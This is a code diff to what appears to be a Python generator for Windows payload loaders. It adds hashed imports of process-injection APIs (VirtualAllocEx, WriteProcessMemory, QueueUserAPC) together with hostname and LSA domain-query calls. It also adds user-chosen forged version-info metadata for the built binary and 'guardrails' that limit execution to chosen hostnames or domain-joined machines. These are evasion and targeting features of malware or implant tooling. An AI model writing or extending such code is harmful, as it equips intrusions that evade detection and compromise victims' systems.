@@ -39,9 +39,11 @@ def _get_api_hashes():
         "CreateProcessA", "VirtualAllocEx", "WriteProcessMemory", "QueueUserAPC", "ResumeThread",
         "lstrlenA", "GetEnvironmentVariableA", "VirtualProtectEx", "GetLastError",
         "NtCreateSection", "NtMapViewOfSection", "SleepEx", "NtCreateJobObject",
-        "NtSetInformationJobObject", "NtAssignProcessToJobObject"
+        "NtSetInformationJobObject", "NtAssignProcessToJobObject",
+        "GetComputerNameA",
+        "LsaOpenPolicy", "LsaQueryInformationPolicy", "LsaFreeMemory", "LsaClose"
     ]
-    module_names = ["KERNEL32.DLL", "NTDLL.DLL", "CABINET.DLL", "WINHTTP.DLL"]
+    module_names = ["KERNEL32.DLL", "NTDLL.DLL", "CABINET.DLL", "WINHTTP.DLL", "ADVAPI32.DLL"]
     
     hashes = {}
     for name in api_names:
@@ -149,11 +151,17 @@ def _prepare_template_context(options, manifest_data, payload_bytes=None):
                 if key == 'name': continue
                 final_version_info[f'version_info_{key}'] = selected_template.get(key, '')
 
-    elif options.get('version_info_company_name'):
+    # Apply overrides from options (or full custom if no template)
+    has_custom_data = False
+    for key in sample_template.keys():
+        if key == 'name': continue
+        user_val = options.get(f'version_info_{key}')
+        if user_val:
+            final_version_info[f'version_info_{key}'] = user_val
+            has_custom_data = True
+    
+    if has_custom_data:
         template_vars['version_info_mode'] = 'custom'
-        for key in sample_template.keys():
-            if key == 'name': continue
-            final_version_info[f'version_info_{key}'] = options.get(f'version_info_{key}', '')
     
     if template_vars.get('version_info_mode') != 'none':
         file_ver_str = final_version_info.get('version_info_file_version') or '1.0.0.1'
@@ -171,6 +179,14 @@ def _prepare_template_context(options, manifest_data, payload_bytes=None):
             if key not in ['version_info_file_version', 'version_info_product_version']:
                  template_vars[key] = val
     
+    # --- Guardrails Processing ---
+    guardrail_domain_joined = (options.get('guardrail_domain_joined') == 'true')
+    guardrail_hostname = options.get('guardrail_hostname', '')
+    
+    template_vars['guardrail_domain_joined'] = guardrail_domain_joined
+    template_vars['guardrail_hostname'] = guardrail_hostname
+    template_vars['guardrails_needed'] = guardrail_domain_joined or bool(guardrail_hostname)
+
     return template_vars
 
 def _run_subprocess(command, cwd, temp_file_to_debug=None, file_encoding='ascii'):
